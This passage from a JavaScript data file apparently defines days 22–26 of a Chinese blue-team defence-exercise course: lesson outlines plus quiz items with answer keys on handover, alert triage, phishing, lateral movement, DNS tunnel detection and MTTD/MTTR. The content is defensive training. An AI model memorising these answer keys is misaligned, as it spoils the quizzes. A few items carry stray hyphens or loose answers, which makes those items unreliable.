      {type:'fill',question:'战前排期最后一天应留出___时间，用于处理前面几天未按计划完成的任务和各种突发情况。',correctAnswer:'缓冲/buffer',explanation:'预留缓冲时间=计划智慧。7天计划实际按6天排，第7天=弹性补漏+最终检查。计划做得太满一旦出现意外就会全面延迟。'},
      // 护网全流程管理
      {question:'护网全流程管理中，战前筹备阶段最容易犯的错误是什么？',options:['准备太充分','"还早着呢"的心态，一直拖到护网开始前几天才开始准备','提前太多开始准备','雇了太多人'],correctIndex:1,explanation:'拖延=最大敌人。安全加固不像装软件——补丁可能影响业务需要测试、策略变更可能产生连锁反应需要观察、资产梳理可能需要跨部门协调。每一项都需要时间缓冲。'},
      {type:'boolean',question:'护网战前只要把技术问题解决就行了，人的问题（值班安排、通讯机制、上报流程）不需要提前准备。',options:['正确','错误'],correctIndex:1,explanation:'错误！护网=技术+人+流程。人没有排好班、不知道出了问题找谁汇报、通讯群没建好→技术准备得再好也等于零。'},
      // 实战
      {question:'战前加固中发现一台重要的生产服务器有高危漏洞，但打补丁需要重启服务器（影响业务），应该如何处理？',options:['不打了','立即打补丁并重启','评估风险→和业务方协调停机窗口→如果无法立即修复则在WAF/IPS部署虚拟补丁作为临时缓解→排入维护窗口修复','忽略'],correctIndex:2,explanation:'打的=理想。打不了=虚拟补丁+收紧访问控制(WAF规则/限制来源IP)+通知业务方+排入最近维护窗口。安全不能以完全中断业务为代价。'},
      {type:'fill',question:'战前策略收敛中，防火墙应执行___原则：默认拒绝所有入站流量，仅开放业务必须的端口和服务。',correctAnswer:'最小权限/默认拒绝',explanation:'默认拒绝=只有明确允许的才能通过。不要有"先全开再慢慢收敛"的想法——护网开始后你没时间慢慢关的。'},
      {question:'战前加固周最理想的启动时间是什么？',options:['护网开始前1天','护网开始前3-4周（2-3周加固+1周缓冲检查）','护网开始当天','不需要提前启动'],correctIndex:1,explanation:'3-4周=理想时间。1-3周完成各项加固工作，最后1周做全面验证和缓冲补漏。1天？只能求神拜佛了。'},
      {type:'multiple',question:'战前加固的"漏洞修复"工作包括哪些？（多选）',options:['操作系统和中间件安全补丁更新','应用代码漏洞修复','弱口令排查和强制修改','不必要的服务和端口关闭'],correctIndices:[0,1,2,3],explanation:'漏洞修复=全方位。系统补丁+应用漏洞+弱口令+不必要服务，任何一个层面有漏洞就会成为攻击入口。'},
      {type:'boolean',question:'战前将WAF切换为"防护模式"（而非仅检测告警）是护网战前准备的关键动作。',options:['正确','错误'],correctIndex:0,explanation:'正确。护网期间WAF必须处于阻断模式，检测模式=只记录不拦截=形同虚设。'},
      {question:'战前准备中，确认"NTP时间同步"对所有设备生效为什么很重要？',options:['方便看手表','确保所有安全设备和服务器日志时间一致，攻击时间线不会因为时间不同步出现断档和混乱','满足法规要求','没有任何作用'],correctIndex:1,explanation:'NTP时间同步=日志分析的基础。各设备时间不一致=无法串联多源日志还原攻击时间线。确认所有设备误差在1秒以内。'},
      {type:'fill',question:'护网战前应进行至少___次全流程演练（模拟攻击→检测→研判→处置→闭环），确保每个环节的流程和人员都准备就绪。',correctAnswer:'1-2/一两次',explanation:'实战演练=检验流程是否畅通、人员是否熟练。至少一次全流程演练可以发现很多纸面上发现不了的问题。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-23', day: 23,
    title: '实战模拟·首日攻击高峰',
    subtitle: '全流程模拟与统筹沉淀周（高级岗全能力达标）',
    objectives: ['输出首日日报+3份重点事件单', '交接班无遗漏', '批量处理100+告警'],
    keyPoints: ['三班倒交接', '批量告警处理', '高频IP封禁', '态势日报撰写', '重点事件单'],
    content: `# Day 23：实战模拟·首日攻击高峰

> **阶段**：全流程模拟与统筹沉淀周（高级岗全能力达标）

## 📚 核心学习内容
- 资料：前序所有SOP
- 新增：模拟早/中/晚三班倒交接

## 🔧 实操任务
- 批量处理100+告警
- 封禁高频IP
- 撰写首日态势日报

## ✅ 验收标准
- 输出首日日报 + 3份重点事件单
- 交接班无遗漏`,
    quiz: [
      // 三班倒交接
      {question:'护网攻防演练中，三班倒交接时最重要的原则是什么？',options:['准时下班','信息不丢失、不遗漏','只交接紧急事件','口头传达即可'],correctIndex:1,explanation:'交接核心原则=信息不丢失、不遗漏。需书面记录：当前攻击趋势、未关闭事件、待办事项、设备状态。'},
      {type:'fill',question:'三班倒交接应书面记录四个要素：攻击趋势、未关闭事件、___事项和设备状态。',correctAnswer:'待办',explanation:'四个交接要素：攻击趋势→未关闭事件→待办事项→设备状态，确保下一班无缝衔接。'},
      {question:'三班倒交接中，交班方忘记告知接班方"正在排查一个可疑IP还没出结论"，接班方也没有查台账。结果该IP在夜间成功发动了攻击。问题出在哪？',options:['攻击者水平高','交接信息不完整——未关闭事件没有书面记录和口头确认','交班方要负全责','这是正常情况'],correctIndex:1,explanation:'交接失败典型案例=关键信息依赖口头传递。必须书面记录(台账/日报)+口头确认(接班方复述确认)，双重机制避免遗漏。'},
      {type:'boolean',question:'交接时只要把大概情况说清楚就行，不用写书面文档。',options:['正确','错误'],correctIndex:1,explanation:'错误！口头交接会在传递中失真、遗忘。必须书面记录——攻击趋势+未关闭事件+待办事项+设备状态，接班方签字确认。'},
      // 批量告警处理
      {question:'护网首日突然收到500条告警，其中大部分是扫描探测类。正确的处理策略是什么？',options:['逐条处理每条告警','优先批量封禁高频扫描IP，然后聚焦入侵类(P0/P1)告警的深度研判','全部忽略','告警太多直接下班'],correctIndex:1,explanation:'首日告警高峰处理策略=①先封高频扫描IP(降低噪音)②集中精力研判P0/P1入侵告警③P2/P3批量记录但暂不深入④分批向接班方交代。'},
      {type:'multiple',question:'面对批量告警时，以下哪些策略可以有效处理？（多选）',options:['按告警级别（P0→P3）排优先级','先批量封禁高频扫描IP降噪','用SIEM聚合同类告警后再分析','对所有告警平均分配时间'],correctIndices:[0,1,2],explanation:'批量处理=分级+封噪+聚合+并行。区分轻重缓急合理分配精力是值守的核心能力。'},
      {type:'fill',question:'面对告警洪峰时，应遵循___原则：先处理真正严重的入侵事件，探头探测类告警封禁后批量归档。',correctAnswer:'分级处置/优先级',explanation:'分级处置=把有限的人力和时间优先投入到P0/P1级别的真正威胁上，而非被P2/P3的低风险告警淹没。'},
      // 高频IP封禁
      {question:'护网期间封禁IP后，仍能收到来自该IP的告警，说明什么？',options:['攻击太强封不住','封禁策略可能未生效——检查防火墙/WAF封禁规则是否正确下发','IP是动态的','应该封禁整个网段'],correctIndex:1,explanation:'封禁后仍有告警=封禁策略有问题(可能是设备上的封禁列表未同步/规则顺序错误/设备不支持)。应立即排查封禁策略在线验证。'},
      {type:'boolean',question:'只要把攻击IP封禁了就万事大吉，不需要再关注该IP。',options:['正确','错误'],correctIndex:1,explanation:'错误！封禁后应观察：①封禁是否生效（此IP是否还在产生告警）②攻击者是否更换IP继续攻击③攻击者被挡后改用其他方式攻击。'},
      // 态势日报
      {question:'首日态势日报与日常日报相比，应额外突出什么内容？',options:['员工出勤','首日的攻击全景图——攻击来源分布、主要攻击类型、TOP攻击事件、与平日的环比差异','设备品牌型号','天气预报'],correctIndex:1,explanation:'首日日报=建立基准。展示"护网开始了，这就是当前的战况"。对比平日数据可看出护网攻击与日常攻击的显著差异。'},
      {type:'fill',question:'首日态势日报中的___图可以直观展示攻击来源的地理或IP段分布，帮-助识别是否有集中攻击行为。',correctAnswer:'攻击来源分布/热力',explanation:'攻击来源分布图=哪些地区/IP段的攻击最密集。如果某国某段IP集中攻击=可能有组织攻击队。可用于优化地域封禁策略。'},
      // 重点事件单
      {question:'护网中一份合格的"重点事件单"的详细程度应达到什么标准？',options:['一两句话概括','能让没值班的人看完就知道发生了什么、处置了什么、为什么要这样处置、还有什么要跟进','越长越好','只需要有事件名称'],correctIndex:1,explanation:'事件单=自包含的叙事：What(发生了什么)→Why(为什么这么判断)→How(怎么处置的)→Next(还有什么没做完)。不需要上下文就能看懂。'},
      {type:'fill',question:'重点事件单应包含：事件时间、___IP、目标资产、攻击类型、核查结论、处置动作、最终状态。',correctAnswer:'来源/源',explanation:'七个要素=事件时间+来源IP+目标资产+攻击类型+核查结论+处置动作+最终状态(已闭环/待跟进)。'},
      // 实战综合
      {question:'护网首日你值早班，接班前中班同事口头说"没什么大事"。你翻开台账后发现有一条未关闭的P0事件单——某核心服务器的入侵告警已被标记为"处置中"但没有后续跟进。你应该？',options:['信任同事直接忽略','立即核实该P0事件的当前状态，如果仍在进行中则接手继续处置，并反馈交接漏洞','自己也下班了','等着下次再说'],correctIndex:1,explanation:'口头说"没什么大事"但台账显示P0未关闭=交接漏洞。正确做法=不受口头信息影响，按台账核实，接手未完成事项，并向主管反馈交接流程问题。'},
      {type:'boolean',question:'护网首日攻击高峰时，最有效的应对策略是多招人来值班。',options:['正确','错误'],correctIndex:1,explanation:'错误！人多不一定高效。更关键的策略是：自动化批量处理+分级优先级+聚焦P0/P1。10个有策略的人>30个没有策略的人。'},
      {question:'早班发起了一次全站SQL注入扫描后，中班发现WAF告警突然增长300%。中班最合理的做法是什么？',options:['不管','立即查告警特征判断是否为同一攻击类型→确认来源→如果确认为同一攻击则批量处理+写入态势日报趋势说明','放弃抵抗','封禁所有HTTP请求'],correctIndex:1,explanation:'攻击类型变化=日报中最有价值的内容。不仅处理告警本身，还要分析"为什么现在出现了这种攻击类型"和"攻击者意图是什么"。'},
      {type:'multiple',question:'以下哪些是护网首日值守工作的关键事项？（多选）',options:['建立攻击基线（什么水平的攻击算"正常"）','验证各安全设备告警/阻断是否正常生效','确认通讯和上报链路畅通','完成首日态势日报'],correctIndices:[0,1,2,3],explanation:'首日工作四件套=建立基线+验证设备+确认通讯+首日日报。首日是"校准日"，确保所有系统正常运转。'},
      {type:'fill',question:'首日值守中，___是对比平日数据，识别护网特有的攻击特征（如攻击频率、攻击类型、攻击源）。',correctAnswer:'建立基线',explanation:'首日基线=回答"护网和平时有什么不同"。这个基线决定了后续所有日子的告警研判参考标准。'},
      {question:'你值班时发现一台服务器被上传了Webshell并触发了告警，但告警规则被前班人员临时关闭了（为了减少误报），导致你接班时没收到。这种情况如何预防？',options:['没有办法','建立规则变更审批和交接记录机制——任何规则变更必须在台账中记录并在交接时确认','不要关规则','骂前班的人'],correctIndex:1,explanation:'规则变更=高风险操作必须有记录+审批+交班确认。这是蓝队管理的关键流程漏洞，通过制度补上。'},
      {type:'fill',question:'三班倒交接中，最容易被遗忘但最致命的信息是___（正在处理的但尚未得出结论的事件）。',correctAnswer:'未关闭/进行中',explanation:'未关闭事件=接班方最容易遗忘的部分。不像"已处置完毕"有明确标记，"进行中"容易被淹没。必须在交接记录中用红色/高亮标记。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-24', day: 24,
    title: '实战模拟·定向攻击与内网失陷',
    subtitle: '全流程模拟与统筹沉淀周（高级岗全能力达标）',
    objectives: ['输出专项事件复盘报告+整改加固方案', '完成应急启动→遏制→溯源→整改加固全流程'],
    keyPoints: ['钓鱼邮件投递', '内网横向移动', '应急启动', '遏制措施', '溯源分析', '整改加固'],
    content: `# Day 24：实战模拟·定向攻击与内网失陷

> **阶段**：全流程模拟与统筹沉淀周（高级岗全能力达标）

## 📚 核心学习内容
- 新增：模拟钓鱼邮件投递+内网横向移动场景

## 🔧 实操任务
- 完成应急启动→遏制→溯源→整改加固全流程

## ✅ 验收标准
- 输出专项事件复盘报告 + 整改加固方案`,
    quiz: [
      // 内网横向移动
      {question:'内网横向移动的常见手法不包括以下哪一项？',options:['Pass-the-Hash（哈希传递）','WMI远程执行','DDoS流量攻击','RDP远程桌面'],correctIndex:2,explanation:'Pass-the-Hash、WMI、RDP均为横向移动常见手法。DDoS是拒绝服务攻击，目标是瘫痪服务而非内网渗透。'},
      {type:'boolean',question:'内网失陷后的标准应急流程是：确认失陷→应急启动→遏制蔓延→清除后门→溯源路径→整改加固→复盘归档。',options:['正确','错误'],correctIndex:0,explanation:'正确。完整七步流程确保从发现到闭环的全覆盖，每个环节都不可跳过。'},
      {question:'Pass-the-Hash（PTH）攻击为什么对Windows域环境特别危险？',options:['影响Linux系统','利用Windows NTLM认证机制缺陷，攻击者获取任意一个域用户的NTLM哈希后可在域内任意横向跳转','需要物理接触服务器','只影响Windows XP'],correctIndex:1,explanation:'PTH=用哈希值当密码。Windows NTLM认证在某些场景下接受哈希值而非明文密码，攻击者拿到域用户密码哈希后，等于拿到了域内任意跳转的"万能钥匙"。'},
      {type:'fill',question:'Pass-the-Hash攻击中最常被获取高价值哈希的账户类型是___（如域管理员或本地管理员）。',correctAnswer:'域管理员/Domain Admin',explanation:'域管理员哈希=终极目标。一旦获取域管理员哈希，攻击者可以通过PTH技术以域管理员身份登录域内任何一台机器。'},
      {type:'multiple',question:'以下哪些是内网横向移动常见的技术？（多选）',options:['WMI远程执行','PsExec','RDP远程桌面','SSH(域内Linux主机)','DCOM'],correctIndices:[0,1,2,3,4],explanation:'以上全部。PTH+WMI执行命令、PsExec部署后门、RDP直接桌面、SSH跳转Linux、DCOM远程调用——攻击者工具箱里五花八门。'},
      // 钓鱼邮件
      {question:'定向钓鱼邮件（Spear Phishing）中，攻击者最常使用的社会工程学技巧是什么？',options:['随机群发垃圾邮件','针对收件人的个人信息定制邮件内容（如伪装成同事/领导/供应商），利用信任关系','使用明显的垃圾邮件标题','发送彩票中奖通知'],correctIndex:1,explanation:'定制化=定向钓鱼的核心。攻击者事先研究目标（领英/微博/公司网站），用目标熟悉的人名、项目名、供应商名伪装邮件，大幅降低警惕性。'},
      {type:'fill',question:'钓鱼邮件防御中，___（缩写）技术通过加密验证发件人域名和邮件完整性，可有效识别伪造邮件的来源。',correctAnswer:'DMARC/DKIM/SPF',explanation:'SPF/DKIM/DMARC=邮件认证三件套。SPF验证发件IP是否授权，DKIM验证邮件未被篡改，DMARC定义认证失败的处理策略。'},
      {question:'收到一封"IT部门"发来的"紧急安全更新"邮件，附件是一个.exe文件。作为蓝队，你应该首先怀疑什么？',options:['IT部门效率很高','这是钓鱼邮件——IT部门不会通过邮件附件方式推送安全补丁','真的有紧急更新','附件无害'],correctIndex:1,explanation:'IT部门不会通过邮件+.exe附件推送补丁=典型钓鱼套路。紧急+权威身份+催促=钓鱼邮件三要素。正确做法=通过其他渠道(电话/企业IM)联系IT部门确认。'},
      // 应急启动→遏制→溯源
      {question:'内网失陷后，应急遏制阶段应优先隔离什么？',options:['打印机','已确认失陷的主机和核心资产（域控/数据库）','所有Windows机器','监控摄像头'],correctIndex:1,explanation:'遏制优先级=已失陷主机(防扩散)+核心资产(域控/数据库，保底线)。先把感染源和最有价值目标保护起来，再逐步处理其他受影响资产。'},
      {type:'boolean',question:'钓鱼邮件攻击发生后，第一件事是先找出是谁发送的钓鱼邮件，再通知可能受到影响的其他用户。',options:['正确','错误'],correctIndex:1,explanation:'错误！第一件事=通知全员不要点击该邮件+在邮件网关删除该邮件所有副本+排查已中招的用户。溯源是谁发的可以逐步推进，但遏制扩散必须立即执行。'},
      {type:'fill',question:'内网失陷溯源中，___是最关键的日志源，因为所有横向移动都会在目标主机产生登录事件(4624)。',correctAnswer:'Windows安全日志',explanation:'域控/服务器的安全日志=横向移动的足迹。每次PTH/WMI/RDP跳转都产生登录事件，追溯这些事件就能画出攻击者在内网中的完整移动路线。'},
      {question:'发现内网一台Web服务器的w3wp.exe进程的父进程变成了cmd.exe，这个现象说明什么？',options:['正常HTTP请求处理','通过Web漏洞成功执行了系统命令（命令注入/Webshell触发），攻击者已在服务器上取得命令执行权限','系统自动优化','Web服务器更新'],correctIndex:1,explanation:'w3wp(IIS工作进程)→fork cmd.exe=Web攻击成功的铁证。正常Web请求不会让Web服务进程执行系统命令。这说明攻击者已经突破了Web层进入了系统层。'},
      // 整改加固
      {question:'内网失陷事件处置后，最重要的加固措施是什么？',options:['开除员工','堵住本次攻击利用的所有入口（漏洞修补/弱口令修改/权限收紧），并部署检测同类攻击的监控规则','买新设备','起诉攻击者'],correctIndex:1,explanation:'加固=消除本次攻击的根因+防止同类攻击再发生。入口堵住+同类攻击的监控覆盖=确保同样手法无法再次成功。'},
      {type:'multiple',question:'内网失陷后的整改加固应包含哪些方面？（多选）',options:['修复导致初始入侵的漏洞','全网弱口令清查和强制修改','收紧网络ACL（限制横向移动端口）','部署EDR实现主机级行为监控','全员安全培训（针对本次钓鱼手法）'],correctIndices:[0,1,2,3,4],explanation:'加固需全方位：入口修复+凭证加固+网络限制+终端监控+人员意识。每一项对应一个被利用的攻击面。'},
      // 实战
      {question:'护网期间，安全团队发现内网多台机器同时出现了相同的异常外联行为（连接同一境外IP的443端口，心跳包频率30秒）。最可能的解释是什么？',options:['这些机器安装了相同的合法软件','攻击者已在内网大规模部署后门（C2），正在通过这些后门远程控制多台机器','网络设备故障','正常的云服务同步'],correctIndex:1,explanation:'多台机器+相同C2地址+规律心跳=攻击者用自动化工具批量部署了后门。这说明攻击者已经在域内有较高权限，可能已拿下域控或在推送GPO。需立即进入战时状态。'},
      {type:'fill',question:'钓鱼邮件攻击后进行演练整改，应新增一条检测规则：邮-件来自外部+包含___文件类型+紧急/催促类词汇=高风险钓鱼告警。',correctAnswer:'exe/可执行',explanation:'外部来源+.exe/.vbs/.js/.ps1等可执行脚本附件+紧急催促用语=钓鱼邮件高概率组合特征。应在邮件网关层直接阻断而非让用户判断。'},
      {type:'boolean',question:'完成一轮整改加固后，内网就绝对安全了。',options:['正确','错误'],correctIndex:1,explanation:'错误！安全是持续过程。攻击者会不断寻找新的攻击路径，你的加固堵住了上次的入口，但他们还会尝试其他入口。需要持续监控+定期复测。'},
      {question:'内网失陷后，如何判断攻击者是否已经"清理干净"不会卷土重来？',options:['攻击者自己说已退出','通过多维度交叉验证：①所有恶意进程/文件已清除②异常外联已消失③新增的账户/后门/Scheduled Task已删除④一周内无同类告警复发⑤已修复使入侵成功的根因漏洞','不需要判断','重新格式化所有服务器'],correctIndex:1,explanation:'确认清除=多维验证+因果修复。光删文件不够，还需确认：①不再有行为复现②进入的通道已经堵住。攻击者最常用的手法就是在被清除后利用同样的漏洞再次入侵。'},
      {question:'模拟攻击中，红队成功通过钓鱼邮件让某员工打开了带宏的Word文档。你的蓝队应在哪个环节发现这次攻击？',options:['寄希望于员工报告','多层检测：邮件网关检测到可疑附件→EDR检测到Word.exe创建了子进程powershell.exe→SIEM关联产生告警','等数据被窃取后发现','周末复盘发现'],correctIndex:1,explanation:'纵深防御要的就是多层检测——邮件网关是第一层（拦不住还有EDR），EDR是第二层（拦不住还有SIEM），SIEM是第三层。任何一层告警都能触发应急。'},
      {type:'fill',question:'应急响应中，___是指立即切断攻击者通信通道和隔离受影响系统的方法，优先级应高于溯源分析。',correctAnswer:'遏制/Containment',explanation:'遏制优先于溯源——先止血再查病因。等溯源完了血都流光了。实际操作中遏制和溯源可并行推进，但遏制指令优先执行。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-25', day: 25,
    title: '实战模拟·APT隐蔽攻击与收尾',
    subtitle: '全流程模拟与统筹沉淀周（高级岗全能力达标）',
    objectives: ['输出隐蔽攻击分析报告+防守数据统计表', '完成全域风险排查', '掌握MTTD/MTTR统计'],
    keyPoints: ['隐蔽隧道通信', '数据外发检测', '全域风险排查', '攻击定性', 'MTTD/MTTR', '防守成效统计'],
    content: `# Day 25：实战模拟·APT隐蔽攻击与收尾

> **阶段**：全流程模拟与统筹沉淀周（高级岗全能力达标）

## 📚 核心学习内容
- 新增：模拟隐蔽隧道通信与数据外发场景

## 🔧 实操任务
- 完成全域风险排查
- 攻击定性
- 防守成效统计（如MTTD/MTTR）

## ✅ 验收标准
- 输出隐蔽攻击分析报告 + 整体防守数据统计表`,
    quiz: [
      // MTTD/MTTR
      {type:'fill',question:'MTTD指平均___时间（Mean Time to Detect），MTTR指平均___时间（Mean Time to Respond），是衡量蓝队效率的核心KPI。',correctAnswer:'检测/响应',explanation:'MTTD=平均检测时间，衡量从攻击发生到被发现的速度。MTTR=平均响应时间，衡量从发现到处置完成的速度。'},
      {question:'以下哪项是APT攻击隐蔽数据外传的常见手法？',options:['HTTP GET请求明文传输','DNS隧道、ICMP隧道、分段加密HTTPS传输','UDP广播','Telnet明文登录'],correctIndex:1,explanation:'DNS/ICMP隧道和分段加密HTTPS是APT常用的隐蔽外传手段。DNS隧道利用DNS查询携带数据，ICMP隧道利用ping包，分段传输降低单次流量异常度。'},
      {type:'boolean',question:'护网收尾阶段只需清点战果、写个总结即可，无需做全域风险排查。',options:['正确','错误'],correctIndex:1,explanation:'错误。收尾阶段必须做全域风险排查：检查是否有残留后门、未清理的测试账户、被篡改的文件，防止护网结束后攻击者利用护网期间留下的入口。'},
      {type:'multiple',question:'防守成效统计中除了MTTD/MTTR，还应包含哪些指标？（多选）',options:['封禁IP总数','处置事件总数','误报率','告警总数'],correctIndices:[0,1,2,3],explanation:'完整防守成效=封禁IP数+处置事件数+告警总数+误报率+MTTD+MTTR+成功入侵次数（越少越好）。数据化呈现防守价值。'},
      // 隐蔽隧道
      {question:'DNS隧道为什么难以被传统防火墙发现？',options:['防火墙默认允许DNS（UDP 53端口），因为DNS是上网的必要协议','DNS是加密的','防火墙不检查DNS','DNS速度太快'],correctIndex:0,explanation:'防火墙默认允许DNS——所有设备都要查询DNS才能上网。攻击者利用这个"必须开放"的通道，将数据隐藏在DNS查询中，防火墙不加深度检查根本无法区分正常DNS和DNS隧道。'},
      {type:'fill',question:'检测DNS隧道的有效方法是分析DNS查询的___特征：正常域名查询有语义，隧道查询通常是随机字符串+固定长度。',correctAnswer:'熵/随机性',explanation:'熵值分析=正常域名查询(www.baidu.com)有规律的低熵字符串，隧道查询(aB3x9K.dGAx3.com)是高熵随机字符串。通过统计域名熵值可以有效检测DNS隧道。'},
      {question:'ICMP隧道利用什么协议特性传输数据？',options:['利用ICMP Echo Request/Reply的Data字段可以携带任意数据','ICMP有加密功能','ICMP速度特别快','ICMP不需要IP地址'],correctIndex:0,explanation:'ICMP Echo(ping)包的Data字段默认可携带二进制数据（如"abcdefgh"），攻击者把窃取的数据编码后填充到这个字段中通过ping包外传。'},
      {type:'boolean',question:'只有APT攻击者才会使用DNS/ICMP隧道，普通的护网红队不会。',options:['正确','错误'],correctIndex:1,explanation:'错误！DNS/ICMP隧道是常见的绕过防火墙外传数据的手法，护网中的高级红队同样会使用。蓝队必须确保对其有检测覆盖。'},
      // 全域风险排查
      {question:'护网收尾阶段的全域风险排查最关键的检查项是什么？',options:['检查所有设备是否在线','排查护网期间可能被攻击者留下的残留后门：新增账户/计划任务/服务/启动项/隐蔽后门文件','统计设备数量','检查网线是否插好'],correctIndex:1,explanation:'排查残留=防"人走了后门还在"。护网期间攻击者可能成功部署了后门但因时间不够未使用，护网结束后随时可能启用。需重点查：新增账户+计划任务+服务+启动项+Web目录新增文件。'},
      {type:'multiple',question:'以下是护网收尾排查的具体检查项，正确的有哪些？（多选）',options:['全量资产核对（护网前后资产变化）','全网弱口令和新增账户排查','Web目录/系统目录文件变更检查','网络ACL/FW规则恢复至非护网状态','SIEM中的未关闭事件复查'],correctIndices:[0,1,2,4],explanation:'ACL/策略是否需要恢复到护网前状态=看情况。但资产核对+账户排查+文件检查+未关闭事件复查=必做。'},
      {type:'fill',question:'护网收尾排查中，___是指在护网结束后一定时间内维持护网级别的监控强度，防止攻击者用护网期间留下的手段在护网结束后发动攻击。',correctAnswer:'延长监控/后护网监控',explanation:'延长监控期=通常护网结束后的1-2周仍维持高度监控。很多攻击者知道护网结束=防守放松，专门选择护网后发动攻击。'},
      // 防守成效统计
      {question:'以下哪个指标最能反映蓝队"发现攻击"的能力？',options:['封禁IP数','MTTD（平均检测时间）','告警总数','处置事件数'],correctIndex:1,explanation:'MTTD=从攻击发生到检测发现的时间。MTTD越短=蓝队眼睛越尖、反应越快。告警总数取决于攻击方活跃度，不是蓝队能力的直接指标。'},
      {type:'fill',question:'防守成效报告中，应区分两类指标：___类指标（封禁IP/处置事件/告警总量）反映工作量，___类指标（MTTD/MTTR/漏报率）反映能力和效率。',correctAnswer:'数量/效率',explanation:'数量指标=干多少活，效率指标=干得怎么样。甲方关心的不只是"你们很忙"，而是"你们干得有没有效果"。'},
      {type:'boolean',question:'护网结束后，防守成效统计中成功入侵次数越少越好，0次是最理想状态。',options:['正确','错误'],correctIndex:0,explanation:'正确。成功入侵次数=蓝队防线的最终检验指标。即使告警处理再及时、封禁IP再多，如果最终有多次被成功入侵且数据丢失，分数不会太高。'},
      // 攻击定性
      {question:'护网期间对一个持续攻击来源进行"攻击定性"时，最应判断的是什么？',options:['攻击者姓名','攻击意图（脚本小子的随意扫描 vs 有组织有目标的定向攻击）和攻击技术水平','攻击者年龄','攻击者国籍'],correctIndex:1,explanation:'定性核心=攻击意图+攻击水平。是自动化扫描工具还是手工作业的定向攻击？后者威胁远大于前者。这决定了后续投入多少资源去应对。'},
      {type:'fill',question:'攻击定性中，___攻击水平可以通过工具类型（开源扫描器 vs 定制化恶意软件）、操作手法（机械批量 vs 有人工调整模式）综合判断。',correctAnswer:'判断/评估',explanation:'评估攻击水平=看工具+看行为。sqlmap扫一堆=低水平，定制化过WAF的Payload+精确目标选择=高水平。需要不同的应对策略。'},
      // 实战
      {question:'护网收尾阶段，发现内网一台服务器的计划任务列表多了一个名为"SystemHealthCheck"的任务，每天凌晨4点执行一个PowerShell脚本。这最可能是什么？',options:['Windows系统自带任务','护网期间攻击者留下的持久化后门','正常的IT运维任务','错误的任务配置'],correctIndex:1,explanation:'名称像系统任务(SystemHealthCheck)+凌晨执行(没人看)+PowerShell脚本(无文件攻击)=高度可疑的后门持久化。即使护网结束了也要处理！否则护网后随时会丢数据。'},
      {question:'护网结束后怎样向甲方展示MTTD从开始的2小时缩短到后期30分钟的改善？',options:['口头说"我们进步了"','数据图表：以护网天数为横轴，MTTD为纵轴，画出逐日下降趋势线——数据比语言有说服力','不需要展示','只展示后期的数据'],correctIndex:1,explanation:'趋势图=改进的硬证据。从Day1的2小时→Day7的1小时→Day14的30分钟→一条向下走的趋势线，胜过千言万语的"我们进步了"。'},
      {type:'multiple',question:'护网收尾的有效统计指标包括哪些？（多选）',options:['封禁IP每日趋势','MTTD/MTTR逐日改善曲线','攻击类型分布变化','告警量的峰谷变化'],correctIndices:[0,1,2,3],explanation:'完整数据=趋势+效率+分布+峰谷。多维数据交织呈现全面的防守画像。单一指标容易误导。'},
      {type:'fill',question:'MTTD的分子是___，分母是___。MTTD越小，说明蓝队发现攻击的速度越快。',correctAnswer:'总检测时间/检测到的入侵事件数',explanation:'MTTD=\u03a3(每次入侵事件的检测时间)/入侵事件总数。如果一次都没检测到的入侵事件不计入分母（因为不知道发生了），MTTD的统计有幸存者偏差。'},
      {type:'boolean',question:'护网收尾只需要蓝队内部进行，不需要和甲方沟通收尾事宜。',options:['正确','错误'],correctIndex:1,explanation:'错误！收尾需要和甲方正式交底：①移交所有事件处置档案②确认后续监控计划③说明护网结束时注意事项（如账户清理、策略恢复）。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-26', day: 26,
    title: '结项总结与成果归档',
    subtitle: '全流程模拟与统筹沉淀周（高级岗全能力达标）',
    objectives: ['输出完整结项报告（含防守成果、不足与改进计划）', '统一归档全套技战法/SOP/报告'],
    keyPoints: ['结项报告撰写规范', '技战法/SOP/报告统一归档', '防守成果总结', '封禁IP数/处置事件数/MTTD/MTTR', '改进计划制定'],
    content: `# Day 26：结项总结与成果归档

> **阶段**：全流程模拟与统筹沉淀周（高级岗全能力达标）

## 📚 核心学习内容
- 视频：结项报告撰写
- 文档：结项模板3份
- 新增：全套技战法、SOP、报告统一归档

## 🔧 实操任务
- 撰写完整护网项目结项总结报告

## ✅ 验收标准
- 输出完整结项报告（含防守成果、不足与改进计划）`,
    quiz: [
      // 结项报告
      {type:'multiple',question:'护网项目结项报告应包含哪些核心内容？（多选）',options:['防守成果总结','不足与短板分析','后续改进计划','全套归档文档索引'],correctIndices:[0,1,2,3],explanation:'完整结项=成果总结+不足分析+改进计划+归档索引，四部分缺一不可，数据要有封禁IP数/处置事件数/MTTD/MTTR等可量化指标。'},
      {question:'衡量护网防守成效最关键的量化指标组合是？',options:['只看出勤人数','封禁IP数+处置事件数+MTTD+MTTR','网络带宽使用量','安全设备采购金额'],correctIndex:1,explanation:'核心量化指标=封禁IP数（防御成果）+处置事件数（工作量）+MTTD/MTTR（效率）。用数据说话才有力。'},
      {type:'boolean',question:'结项报告中只需展示防守成果，不需要写不足和改进计划，以免影响考核评分。',options:['正确','错误'],correctIndex:1,explanation:'错误。直面不足+提出改进计划恰恰体现了专业度和负责态度，是蓝队长远能力的体现。回避问题反而会被认为缺乏复盘能力。'},
      {type:'fill',question:'全套归档文档应包括：技战法文档、SOP手册、事件处置报告和____。',correctAnswer:'值守日报',explanation:'四项归档核心=技战法文档+SOP手册+事件处置报告+值守日报（含态势周报），完整归档为下次护网提供参考基线。'},
      // 归档
